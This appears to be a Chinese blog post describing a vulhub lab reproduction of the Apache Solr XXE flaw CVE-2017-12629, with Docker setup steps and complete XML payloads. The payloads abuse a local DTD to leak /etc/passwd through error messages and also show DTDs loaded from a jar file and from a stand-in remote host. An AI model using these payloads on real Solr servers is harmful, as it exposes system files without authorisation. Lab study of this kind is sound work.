ailx10说：这篇是我2024年9月写的。这篇 XXE 我没有只看一个“读到了”的结果，而是先读系统文件，再读 hosts，最后拿不同端口的返回继续观察。Solr 的报错反而成了输出通道：本来不该出现的文件内容，被拼进错误信息里带了出来。做完我把本地 DTD、实体重定义和错误路径放在一起记，才看清这条链靠什么成立。这里 hosts 也是本地文件，不是去网络上下载了什么；文件能读到哪、端口结果说明什么，还得受进程权限和解析条件限制。

---

编辑核查提示：本地 DTD 路径、解析器与可读权限决定结果；hosts 是本地文件。端口错误信息只能反映当前网络和解析路径。 原题代码和外部地址未重新运行；截图细字及水印仍待核对。

本文记录 Apache Solr CVE-2017-12629 的 XML 外部实体注入实验，包括读取本地文件与观察服务端连接错误。是否成立取决于解析器、DTD、可读权限和网络配置。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Apache solr XML 实体注入漏洞（CVE-2017-12629）环境搭建成功了

（1）构造XXE载荷，读取passwd文件内容，利用fontconfig-config的fonts.dtd

也可以利用Jar包中的dtd文件

```
<!ENTITY % local_dtd SYSTEM "jar:file:///opt/solr/server/solr-webapp/webapp/WEB-INF/lib/lucene-queryparser-7.0.1.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd">
```

还可以利用远程dtd文件

```
<!ENTITY % local_dtd SYSTEM "http://evil.host.name/include.dtd">

### include.dtd ### 
<!ENTITY % test "example">
<!ELEMENT pattern (%test;)>
```

载荷如下：

```
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```

```
<?xml version="1.0" ?><!DOCTYPE message [    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">    <!ENTITY % expr 'aaa)>        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">        &#x25;eval;        &#x25;error;        <!ELEMENT aa (bb'>    %local_dtd;]><message>any text</message>
```
